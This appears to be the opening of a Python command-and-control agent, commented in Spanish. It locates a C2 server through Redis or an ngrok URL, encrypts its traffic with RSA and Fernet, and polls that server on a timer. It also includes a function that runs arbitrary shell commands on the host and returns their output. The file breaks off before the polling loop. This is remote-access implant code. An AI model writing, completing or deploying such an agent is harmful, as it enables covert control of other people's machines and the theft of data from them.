"""
Agente C2 - Versión HTTPS para ngrok/Internet con Cifrado Híbrido + Redis Discovery
CONFIGURADO PARA: Conectarse a servidor via HTTP/HTTPS (ngrok) con failover automático
CIFRADO: RSA-2048 key exchange + Fernet session encryption
REDIS: Descubrimiento automático de servidores disponibles

USO:
    # Conectar al primer servidor disponible en Redis
    python3 agent_ngrok.py
    
    # Conectar a servidor específico (sin Redis)
    python3 agent_ngrok.py https://abc123.ngrok.io
"""

import json
import subprocess
import platform
import uuid
import time
import sys
import os

try:
    import requests
except ImportError:
    print("[!] ERROR: Se requiere el módulo 'requests'")
    print("[*] Instálalo con: pip install requests")
    sys.exit(1)

# Intentar importar Redis (opcional)
REDIS_AVAILABLE = False
redis_client = None
try:
    import redis
    REDIS_AVAILABLE = True
except ImportError:
    print("[!] Redis no disponible - usando modo URL directa")
    print("[*] Para habilitar Redis: pip install redis")

# Import crypto utilities
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from shared.crypto_utils import C2Crypto

# ============================================
# CONFIGURACIÓN FLEXIBLE
# ============================================

# Redis configuration
REDIS_HOST = os.getenv("REDIS_HOST", "127.0.0.1")
REDIS_PORT = int(os.getenv("REDIS_PORT", 6379))

# Si se pasa URL como argumento, usarla directamente (sin Redis)
if len(sys.argv) >= 2:
    SERVER_URL = sys.argv[1].rstrip('/')
    USE_REDIS = False
else:
    SERVER_URL = None
    USE_REDIS = REDIS_AVAILABLE

AGENT_ID = "agent-" + str(uuid.uuid4())[:6]
RECONNECT_DELAY = 5  # segundos antes de reintentar si se cae la conexión
POLL_INTERVAL = 3    # segundos entre cada poll al servidor (aumentado de 2 a 3)

# Cryptographic state (established during handshake)
agent_session_key = None      # Fernet symmetric key (generated by agent)
server_public_key = None      # Server's RSA public key (fetched from server)

# Servers list (populated from Redis)
servers_list = []
current_server_index = 0


def execute_command(command: str) -> str:
    """Ejecuta un comando del sistema y captura su salida."""
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
        )
        output = result.stdout if result.stdout else result.stderr
        return output.strip() or "(sin salida)"
    except subprocess.TimeoutExpired:
        return "(error) comando excedió el tiempo límite"
    except Exception as e:
        return f"(error) {e}"


